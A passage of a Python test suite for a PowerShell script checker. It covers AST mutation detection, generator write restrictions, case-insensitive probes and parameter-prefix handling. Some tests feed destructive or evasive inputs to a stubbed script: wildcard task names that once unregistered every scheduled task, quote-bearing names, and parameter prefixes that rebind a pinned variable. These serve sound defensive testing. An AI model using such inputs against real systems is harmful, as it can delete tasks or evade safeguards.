    unchanged but change the source digest, and so must CRLF line endings
    (the digest is over exact bytes; .gitattributes pins LF and check_ast
    refuses CR)."""
    exe = _pwsh()
    path = _SCRIPTS / script
    source = path.read_bytes().decode("ascii")
    sites = _run_dumper_raw(exe, [str(path)], "-Sites")[0]
    original = _canonical(_run_dumper_raw(exe, [str(path)], "-AstOnly")[0])
    mutants = _mutants(source, sites)
    files: list[Path] = []
    for i, (_label, text) in enumerate(mutants):
        target = tmp_path / f"m{i:04d}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    neutral = {
        "comment": "# reviewer comment\n" + source,
        "whitespace": "\n\n" + source.replace("\n", "  \n", 1),
        "crlf": source.replace("\n", "\r\n"),
    }
    for name, text in neutral.items():
        target = tmp_path / f"neutral-{name}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    results = _run_dumper_raw(exe, [str(f) for f in files], "-AstOnly", timeout=2400)
    by_path = {Path(r["path"]).name: _canonical(r) for r in results}
    undetected: list[str] = []
    clean = 0
    for i, (label, _text) in enumerate(mutants):
        mutant = by_path[f"m{i:04d}.ps1"]
        if mutant["parse_errors"]:
            continue
        clean += 1
        if mutant["ast"] == original["ast"]:
            undetected.append(label)
    assert not undetected, f"{script}: mutations not reflected in the syntax tree: {undetected}"
    assert clean >= len(mutants) * 0.6, f"{script}: only {clean}/{len(mutants)} mutants parsed"
    for name in ("comment", "whitespace"):  # AST-neutral by construction
        changed = by_path[f"neutral-{name}.ps1"]
        assert changed["ast"] == original["ast"], f"{script}: {name}-only edit changed the tree"
        assert changed["source_sha256"] != original["source_sha256"], name
    crlf = by_path["neutral-crlf.ps1"]
    assert crlf["source_sha256"] != original["source_sha256"], f"{script}: CRLF not detected"


def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The generator writes only the golden file. The semantic policy tables
    (POLICIES, PINNED_VARS, GUARDED_OPS, LOCAL_FUNCTION_BODIES, ...) are hand-
    maintained in this file, so a regeneration can never widen them."""
    import inspect

    generator = (_REPO / "scripts" / "gen_collector_inventory.py").read_text(encoding="utf-8")
    for token in (
        "PINNED_VARS",
        "GUARDED_OPS",
        "LOCAL_FUNCTION_BODIES",
        "STATEMENT_DIGESTS",
        "PIPELINE_INPUTS",
        "SECRET_USES",
        "SCRIPT_HEADERS",
        "POLICIES",
        "write_text",
        "write_bytes",
        "open(",
    ):
        assert token not in generator, f"generator must not touch {token}"
    # The print-only helper is also forbidden from writing and from being wired
    # into the generator.
    printer = (_REPO / "scripts" / "print_statement_digests.py").read_text(encoding="utf-8")
    for token in ("write_text", "write_bytes", ".write("):
        assert token not in printer, f"print helper must not write ({token})"
    assert "print_statement_digests" not in generator
    source = inspect.getsource(write_golden_inventory)
    assert source.count("write_text") == 1 and "GOLDEN_PATH.write_text(" in source
    for token in ("write_bytes", "open("):
        assert token not in source
    guarded = sorted((_REPO / "tests").rglob("*.py")) + sorted((_REPO / "scripts").glob("*"))
    before = {p: p.read_bytes() for p in guarded if p.is_file()}
    monkeypatch.setitem(globals(), "GOLDEN_PATH", tmp_path / "collector-inventory.json")
    write_golden_inventory(_pwsh())
    assert (tmp_path / "collector-inventory.json").is_file()
    assert {p: p.read_bytes() for p in before} == before, "generator modified a tracked file"


# Letters outside quoted strings are re-cased; string contents are data and stay.
def _random_case(text: str, seed: str) -> str:
    # Deterministic per-character coin from the seed (reproducible, no RNG state).
    bits = hashlib.sha256(seed.encode()).digest() * (len(text) // 256 + 1)
    out: list[str] = []
    quote: str | None = None
    for i, ch in enumerate(text):
        if quote:
            out.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "'\"":
            quote = ch
            out.append(ch)
            continue
        flip = (bits[i // 8] >> (i % 8)) & 1
        out.append(ch.upper() if ch.isalpha() and flip else ch.lower())
    return "".join(out)


def _random_case_edit(mode: str, edit: str | tuple[str, str], seed: str) -> str | tuple[str, str]:
    if isinstance(edit, str):
        return _random_case(edit, seed)
    anchor, change = edit
    return (anchor, _random_case(change, seed))


def test_regression_verdicts_are_case_insensitive(tmp_path: Path) -> None:
    """Cross-repo class (adcs-lens `_WRITEJSON` vs `_writeJson`): PowerShell
    resolves commands, functions, parameters, members, types and variables
    case-insensitively, so every regression probe re-cased at random must get
    the same verdict — flagged by its intended check, not by a parse error."""
    exe = _pwsh()
    base_inv = _inventory_for(exe)
    files: list[Path] = []
    for probe_id, base, position, snippet in _REGRESSIONS:
        text = (_SCRIPTS / base).read_text(encoding="utf-8")
        mutated = _apply_edit(text, position, _random_case_edit(position, snippet, probe_id))
        target = tmp_path / probe_id / base
        target.parent.mkdir()
        target.write_bytes(mutated.encode("utf-8"))
        files.append(target)
    results = [
        _canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=2400)
    ]
    wrong: list[str] = []
    for (probe_id, base, _position, _snippet), entry in zip(_REGRESSIONS, results, strict=True):
        assert Path(entry["path"]).parent.name == probe_id
        inv = dict(base_inv)
        inv[base] = entry
        failed = _run_checks(base, inv)
        expected = _PROBE_EXPECTED_CHECK[probe_id]
        if expected not in failed or ("parse" in failed and "using" not in probe_id):
            wrong.append(f"{probe_id}: expected {expected!r}, raised {sorted(failed)}")
    assert not wrong, "re-cased probes changed verdict:\n" + "\n".join(wrong)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_function_bodies_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_local_function_bodies(script, inventory[script])


@pytest.mark.parametrize("name", ["*", "Gpo*", "GpoLens?", "[A-Z]*", "a\\b", "x'y", " lead"])
def test_task_name_wildcards_are_refused_before_unregister(tmp_path: Path, name: str) -> None:
    """Sol round 5 (B2): `-TaskName '*' -Unregister` reached Unregister-
    ScheduledTask and removed every matching task. The shared TaskName
    validator now refuses wildcard/path/quote characters at parameter binding,
    before ShouldProcess or the cmdlet runs (stubbed here; a valid name is the
    positive control)."""
    probe = tmp_path / "unregister.ps1"
    script = _SCRIPTS / "Register-GpoLensCollection.ps1"
    probe.write_text(
        "function Unregister-ScheduledTask { param([string]$TaskName, [switch]$Confirm)\n"
        '  "STUB_UNREGISTER <$TaskName>" }\n'
        "$Name = $args[0]\n"
        f"try {{ & '{script}' -Unregister -TaskName $Name -Confirm:$false }}\n"
        "catch { 'REFUSED ' + $_.FullyQualifiedErrorId }\n"
        f"& '{script}' -Unregister -TaskName 'GpoLensCollection' -Confirm:$false\n",
        encoding="utf-8",
    )
    result = subprocess.run(
        [_pwsh(), "-NoProfile", "-NonInteractive", "-File", str(probe), name],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    out = result.stdout
    assert "REFUSED ParameterArgumentValidationError" in out, out + result.stderr
    assert f"STUB_UNREGISTER <{name}>" not in out
    assert "STUB_UNREGISTER <GpoLensCollection>" in out  # positive control


# Aliases of the variable-writing common parameters (PowerShell's own).
_VARIABLE_PARAM_ALIASES = {
    "outvariable": "ov",
    "pipelinevariable": "pv",
    "errorvariable": "ev",
    "warningvariable": "wv",
    "informationvariable": "iv",
}


def test_variable_param_prefixes_and_aliases_are_resolved(tmp_path: Path) -> None:
    """DeepSeek round 5 (BL-1): `-Pi` is the unambiguous 2-char prefix of
    -PipelineVariable. The dumper resolves every parameter token the way
    PowerShell does, so the full name, each alias, and every unambiguous prefix
    of a variable-writing common parameter must all be caught rebinding a pinned
    root. Each token is run through the real dumper (its resolver is pwsh's)."""
    exe = _pwsh()
    base = (_SCRIPTS / "Export-GpoEstate.ps1").read_text(encoding="utf-8")
    forms: dict[str, tuple[str, str]] = {}  # label -> (token, expected canonical)
    for name in _VARIABLE_WRITING_PARAMS:
        canon = name.casefold()
        forms[f"{name}:full"] = (name, canon)
        forms[f"{name}:alias"] = (_VARIABLE_PARAM_ALIASES[canon], canon)
        for i in range(2, len(name) + 1):  # prefixes; the dumper reports which resolve
            forms[f"{name}:pre{i}"] = (name[:i], canon)
    files: list[Path] = []
    labels = list(forms)
    for label in labels:
        token, _canon = forms[label]
        target = tmp_path / f"{label.replace(':', '_')}.ps1"
        target.write_text(
            base + f"\nGet-Item -LiteralPath '/etc/hostname' -{token} OutputRoot | Out-Null\n",
            encoding="utf-8",
        )
        files.append(target)
    results = [
        _canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=2400)
    ]
    caught_pi_prefix = False
    for label, entry in zip(labels, results, strict=True):
        token, expected = forms[label]
        appended = next(
            c
            for c in reversed(entry["commands"])
            if any(_norm(a["value"]) == "'/etc/hostname'" for a in c["arguments"])
        )
        arg = next(
            a for a in appended["arguments"] if a["parameter"] and _norm(a["value"]) == "OutputRoot"
        )
        canon = arg.get("parameter_canonical")
        if canon != expected:
            continue  # this prefix is ambiguous on Get-Item; PowerShell would not bind it either
        inv = dict(_inventory_for(exe))
        inv["Export-GpoEstate.ps1"] = entry
        failed = _run_checks("Export-GpoEstate.ps1", inv)
        assert "pinned_bindings" in failed, (
            f"{label} (-{token} -> {canon}) was not rejected: {sorted(failed)}"
        )
        if token.casefold() == "pi":
            caught_pi_prefix = True
    assert caught_pi_prefix, "the 2-char prefix -Pi of -PipelineVariable was not exercised"


def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
    for script in POLICIES:
        run_all_checks(script, inventory)
